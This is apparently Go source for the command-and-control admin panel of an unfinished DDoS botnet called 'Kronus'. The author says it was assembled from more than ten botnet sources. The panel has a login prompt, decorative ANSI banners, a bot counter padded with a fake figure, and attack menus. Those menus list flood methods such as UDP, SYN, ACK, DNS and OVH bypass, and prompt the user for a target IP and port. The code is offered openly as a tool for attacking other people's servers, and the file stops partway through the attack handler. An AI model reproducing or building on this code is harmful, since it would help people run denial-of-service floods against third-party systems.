/* This shit was made by extro, its a combination of like 10+ botnet sources + my own code added. i took some good banners and slapped them on there
Also dont ask questions cuz im just not gonna answer u LOLOLOLOL, and i never finished this source. Bye. */
package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
	"net/http"
    "io/ioutil"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
    
//get usernmae
   this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\033[1;31m         Making \033[1;97mConnection \033[1;31mTo \033[1;31mEstablish K R O N U S\033[1;31m Servers \033[0m"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[1;31m        ╔═══════════════════════════════════════════════╗    \033[0m \r\n"))
    this.conn.Write([]byte("\033[1;31m        ║\033[1;97m- - - - - - \033[1;31mWelcome To Kronus \033[1;97m\033[1;97m - - - - - - - - \033[1;31m║  \033[0m \r\n"))
    this.conn.Write([]byte("\033[1;31m        ║\033[1;97m- - - - - - \033[1;31mBuilt Ready And To \033[1;97mNull\033[1;97m - - - - - -\033[1;31m║    \033[0m \r\n"))
    this.conn.Write([]byte("\033[1;31m        ║\033[1;97m- - - -\033[1;31mNo Spamming\033[1;97m + \033[1;31mDon't Share Logins\033[1;97m!- - - -\033[1;31m║    \033[0m \r\n"))
    this.conn.Write([]byte("\033[1;31m        ╚═══════════════════════════════════════════════╝   \033[0m \r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[1;31m        ╔═══════════════════════════════════════════════╗   \033[0m \r\n"))
    this.conn.Write([]byte("\033[1;31m        ║- - - - -\033[1;31mPlease Enter \033[1;97mLogin\033[1;31m Info Below\033[1;97m- - - - -\033[1;31m║   \033[0m \r\n"))
    this.conn.Write([]byte("\033[1;31m        ╚═══════════════════════════════════════════════╝    \033[0m \r\n"))
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[1;31mUsername彼\033[\033[97m: \033[1;31m"))// \033[1;97m  \033[1;31m
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[31mPassword彼\033[37m: \033[37m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[31mScanning Database For Credintials... \033[37m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[31m;1Wrong Credintials\r\n"))
        this.conn.Write([]byte("\\033[31m ip Was logged! (any key to exit)\033[95m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
    this.conn.Write([]byte("\r\n\033[95m"))
            this.conn.Write([]byte("\033[34m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m         | == /        \r\n"))
            this.conn.Write([]byte("\033[34m          |  |         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          |  |         \r\n"))
            this.conn.Write([]byte("\033[34m          |  /         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |/          \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[31m                            \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
			            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m         | == /        \r\n"))
            this.conn.Write([]byte("\033[34m          |  |         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          |  |         \r\n"))
            this.conn.Write([]byte("\033[34m          |  /         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |/          \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                           
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[32m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[32m          | == /       \r\n"))
            this.conn.Write([]byte("\033[32m           |  |        \r\n"))
            this.conn.Write([]byte("\033[32m           |  |        \r\n"))
            this.conn.Write([]byte("\033[32m           |  /        \r\n"))
            this.conn.Write([]byte("\033[32m            |/         \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          | == /       \r\n"))
            this.conn.Write([]byte("\033[32m           |  |        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |  |        \r\n"))
            this.conn.Write([]byte("\033[32m           |  /        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            |/         \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[31m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[31m         | == /        \r\n"))
            this.conn.Write([]byte("\033[31m          |  |         \r\n"))
            this.conn.Write([]byte("\033[31m          |  |         \r\n"))
            this.conn.Write([]byte("\033[31m          |  /         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[31m               | == /       \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |  |        \r\n"))
            this.conn.Write([]byte("\033[32m           |  /        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            |/         \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[31m               |/**/|       \r\n"))
            this.conn.Write([]byte("\033[37m              / == /       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            |  |        \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[31m     _.-^^---....,,--             \r\n"))
            this.conn.Write([]byte("\033[31m _--                  --_         \r\n"))
            this.conn.Write([]byte("\033[31m<                        >)        \r\n"))
            this.conn.Write([]byte("\033[31m|                         |        \r\n"))
            this.conn.Write([]byte("\033[31m /._                   _./         \r\n"))
            this.conn.Write([]byte("\033[31m    ```--. . , ; .--'''            \r\n"))
            this.conn.Write([]byte("\033[31m          | |   |                  \r\n"))
            this.conn.Write([]byte("\033[31m       .-=||  | |=-.               \r\n"))
            this.conn.Write([]byte("\033[31m       `-=#$%&%$#=-'               \r\n"))
            this.conn.Write([]byte("\033[31m          | ;  :|    Welcome to K R O N U S   \r\n"))
            this.conn.Write([]byte("\033[31m _____.,-#%&$@%#&#~,._____         \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(1000 * time.Millisecond)
    for i := 0; i < 4; i++ {
        time.Sleep(300 * time.Millisecond)
    }

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Demons|Demonites:1465| King: %s\007", BotCount, username))); err != nil { //i added some fake botcount to make it look cool LOLS
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[31m                       ╦╔═┬─┐┌─┐┌┐┌┬ ┬┌─┐               \r\n")) //supa heat banner, made by daddy extro 
	this.conn.Write([]byte("\033[31m                       ╠╩╗├┬┘│ │││││ │└─┐  𝓚𝓻𝓸𝓷𝓾𝓼 𝓿.1 \r\n"))
	this.conn.Write([]byte("\033[31m                       ╩ ╩┴└─└─┘┘└┘└─┘└─┘                \r\n"))
	this.conn.Write([]byte("\033[37m                     ꧁🐉D E M O N TEARS🐉꧁                \r\n"))
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[37mK R O N U S\033[31m~彼 "))
        cmd, err := this.ReadLine(false)
        
        if cmd == "Attack" || cmd == "attack" || cmd == "ATTACK" {
    this.conn.Write([]byte("\033[31m                        ╔══════════════════════════════╦══════════════════════════════╗\r\n")) //some of jokers methods + priroritys + Idk another one lol
    this.conn.Write([]byte("\033[31m                        ║ovh [IP] [TIME] dport=[PORT]  ║  std [IP] [TIME] dport=[PORT]║\r\n"))
    this.conn.Write([]byte("\033[31m                        ║nfo [IP] [TIME] dport=[PORT]  ║  udp [IP] [TIME] dport=[PORT]║\r\n"))
    this.conn.Write([]byte("\033[31m                        ║tcp [IP] [TIME] dport=[PORT]  ║  syn [IP] [TIME] dport=[PORT]║\r\n"))
    this.conn.Write([]byte("\033[31m                        ║ack [IP] [TIME] dport=[PORT]  ║  dns [IP] [TIME] dport=[PORT]║\r\n"))
    this.conn.Write([]byte("\033[31m                        ╚════════════╦═════════════════╩══════════════╦═══════════════╝\r\n"))
    this.conn.Write([]byte("\033[37m                                     ║     [+] API METHODS [+]        ║\r\n"))               
    this.conn.Write([]byte("\033[37m                                     ║        -->.API <--             ║\r\n"))
    this.conn.Write([]byte("\033[37m                                     ║ LKZ-SYN      LKZ-OVHV1         ║\r\n"))
    this.conn.Write([]byte("\033[37m                                     ║ LKZ-ICMP     LKZ-SYNBYPASS     ║\r\n"))
    this.conn.Write([]byte("\033[37m                                     ║ LKZ-OPENVPN  LKZ-GRE           ║\r\n"))
    this.conn.Write([]byte("\033[37m                                     ║ LKZ-DOMINATE LKZ-DPR           ║\r\n"))
    this.conn.Write([]byte("\033[37m                                     ╚════════════════════════════════╝\r\n"))
            continue
        }
		
		if cmd == "help" || cmd == "Help" || cmd == "HELP" {
            this.conn.Write([]byte("\033[31m ╔═══════════════════════════\033[31m╗ \r\n")) //basic commands, i never finished this net so LOLS
            this.conn.Write([]byte("\033[31m ║ \033[37madmin             \033[31m║   \r\n"))
            this.conn.Write([]byte("\033[31m ║ \033[37minfo              \033[31m║   \r\n"))
			this.conn.Write([]byte("\033[31m ║ \033[37mTools             \033[31m║   \r\n"))
            this.conn.Write([]byte("\033[31m ║ \033[37mattack            \033[31m║   \r\n"))
			this.conn.Write([]byte("\033[31m ║ \033[37mcls               \033[31m║   \r\n"))
			this.conn.Write([]byte("\033[31m ║ \033[37mAPI (best power)  \033[31m║   \r\n"))
			this.conn.Write([]byte("\033[31m ║ \033[37mwoah              \033[31m║   \r\n"))
			this.conn.Write([]byte("\033[31m ║ \033[37mBanner            \033[31m║   \r\n"))
            this.conn.Write([]byte("\033[31m ╚═══════════════════════════\033[31m╝   \r\n"))
            continue
        }
        			if err != nil || cmd == "api" || cmd == "API" || cmd == "apis" || cmd == "apimethod" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[31m     ╦╔═ ╦═╗ ╔═╗ ╦═╗ ╦ ╦ ╔═╗       ╔═╗╔═╗╦      ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m     ╠╩╗ ╟╦╝ ║ ║ ║ ║ ║ ║ ╚═╗  ───  ╠═╣╠═╝║  ──  ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m     ╩ ╩ ╩╚═ ╚═╝ ╩ ╩ ╚═╝ ╚═╝       ╩ ╩╩  ╩      ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m             ╔═════════════════╗ ╔═════════════════╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m             ║ OVH-KAZUTO      ║ ║ OVH-KAZUTO      ║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m             ║ OVH-SINON       ║ ║ OVH-SINON       ║\033[0m \r\n"))        
            this.conn.Write([]byte("\033[1;49;35m             ║ OVH-YUI         ║ ║ OVH-YUI         ║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m             ╚════════╦════════╝ ╚════════╦════════╝\033[0m \r\n"))                                                           
			this.conn.Write([]byte("\033[1;49;32m\033[0m \r\n"))
			this.conn.Write([]byte("\033[0m\r\n")) 
			continue
        }
			   if err != nil || cmd == "API ATTACK" || cmd == "api attack" || cmd == "attack api" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[1;49;35m\033[0m \r\n"))
			this.conn.Write([]byte("\033[31m                   ╦╔═- ╦═╗- ╔═╗- ╦═╗- ╦ ╦- ╔═╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[31m                   ╠╩╗- ╟╦╝- ║ ║- ║ ║- ║ ║- ╚═╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[31m                   ╩ ╩- ╩╚═- ╚═╝- ╩ ╩- ╚═╝- ╚═╝\033[0m \r\n"))  
			this.conn.Write([]byte("\033[37m               ╔════════════════════════════════════════╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[37m               ║- - - - - - - - - - - - -  - - - - - - -║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[37m               ║- -  𝓟𝓛𝓔𝓐𝓢𝓔 𝓔𝓝𝓣𝓔𝓡 𝓐 𝓘𝓟 𝓐𝓓𝓓𝓡𝓔𝓢𝓢 -  -  -  ║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[37m               ║- - - - - -- - - - - - - - - - - - - - -║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[37m               ╚════════════════════════════════════════╝\033[0m \r\n"))  
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("                          \033[1;49;35m║\033[00;1;95mIP\033[0m: "))
			locipaddress, err := this.ReadLine(false)
			this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[1;49;35m\033[0m \r\n"))
			this.conn.Write([]byte("\033[31m                   ╦╔═- ╦═╗- ╔═╗- ╦═╗- ╦ ╦- ╔═╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[31m                   ╠╩╗- ╟╦╝- ║ ║- ║ ║- ║ ║- ╚═╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[31m                   ╩ ╩- ╩╚═- ╚═╝- ╩ ╩- ╚═╝- ╚═╝\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ╔════════════════════════════════════════╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ║- - - - - - - - - - - - -  - - - - - - -║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ║- - - 𝓟𝓛𝓔𝓐𝓢𝓔 𝓔𝓝𝓣𝓔𝓡 𝓐 𝓟𝓞𝓡𝓣 - - - -  - -  ║\033[0m \r\n"))                                                            
			this.conn.Write([]byte("\033[1;49;35m          ║- - - - - -- - - - - - - - - - - - - - -║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ╚════════════════════════════════════════╝\033[0m \r\n"))  
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("                          \033[1;49;35m║\033[00;1;95mPORT\033[0m: "))
            port, err := this.ReadLine(false)
			this.conn.Write([]byte("\033[2J\033[1H"))
